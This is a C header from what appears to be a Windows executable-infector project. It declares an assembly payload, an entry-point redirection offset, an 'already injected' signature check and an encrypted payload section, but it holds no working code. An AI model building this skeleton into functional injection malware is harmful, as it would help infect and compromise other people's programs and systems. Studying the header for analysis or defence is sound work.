#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_

#include <Windows.h>
#include "injected.h"
#include "utils.h"

EXTERN_C_START

// Extern declarations for the ASM payload (found in payload_{begin,end}.asm)
extern CONST BYTE __payload_start;  // Start of the payload
extern CONST BYTE __payload_end;    // End of the payload
extern CONST VOID payload();        // Payload entry point
extern DWORD code_size;             // Size of the payload code
extern LONGLONG delta_start;        // Delta between original and new entry points
extern LONGLONG to_c_code;          // Offset from the payload to the C payload code (inj_code_c)
#ifndef SKIP_SIGN
extern CONST DWORD signature;  // Signature to check if the payload is already injected
#endif                         // SKIP_SIGN
#ifndef NO_ENCRYPT
extern BYTE __payload_enc_start;  // Start of the encrypted payload
#endif                            // NO_ENCRYPT

/// @brief Payload C code entry point.
INJECTED_CODE VOID inj_code_c();

/// @brief Actual payload.
INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pPayloadData);

EXTERN_C_END

#endif  // _PAYLOAD_H_
